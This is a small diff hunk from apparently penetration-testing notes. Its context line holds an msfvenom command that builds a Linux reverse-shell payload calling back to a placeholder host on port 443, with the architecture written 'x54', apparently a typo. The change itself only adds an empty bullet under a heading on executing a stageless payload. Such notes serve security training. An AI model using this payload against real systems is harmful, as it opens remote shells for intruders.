@@ -39,3 +39,5 @@ msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > createback
 
 ---
 ## Executing a Stageless Payload
+
+- 
